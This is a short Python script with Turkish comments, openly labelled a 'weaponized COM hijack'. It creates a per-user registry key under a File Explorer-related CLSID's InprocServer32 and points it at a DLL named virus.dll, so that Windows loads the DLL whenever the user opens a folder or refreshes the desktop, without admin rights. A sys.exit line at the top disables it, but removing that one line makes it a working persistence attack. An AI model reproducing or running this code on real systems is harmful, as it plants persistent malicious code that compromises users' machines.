import winreg
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod COM nesnelerini manipüle eder.")

print("--- WEAPONIZED COM HIJACK ---")

def hijack_clsid():
    # 1. HEDEF NESNE (Weaponized Part)
    # {b5f8350b...}: "File Explorer" veya "Taskbar" tetikleyicisi
    target_clsid = "{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}"
    
    # HKLM yerine HKCU (Current User) kullanıyoruz (Admin gerekmez)
    key_path = f"Software\\Classes\\CLSID\\{target_clsid}\\InprocServer32"
    
    payload_dll = "C:\\Users\\Public\\virus.dll"
    
    print(f"[*] Hedef CLSID Hijack ediliyor: {target_clsid}")
    
    try:
        # Anahtarı oluştur (HKCU, HKLM'den önceliklidir)
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        
        # 2. YÖNLENDİRME
        # Windows bu nesneyi çağırdığında System32 yerine buraya bakacak
        winreg.SetValue(key, "", winreg.REG_SZ, payload_dll)
        winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
        
        print("💀 HIJACK BAŞARILI.")
        print("Kullanıcı klasör açtığında veya masaüstünü yenilediğinde virüs çalışacak.")
        
    except Exception as e:
        print(f"[-] Hata: {e}")

if __name__ == "__main__":
    hijack_clsid()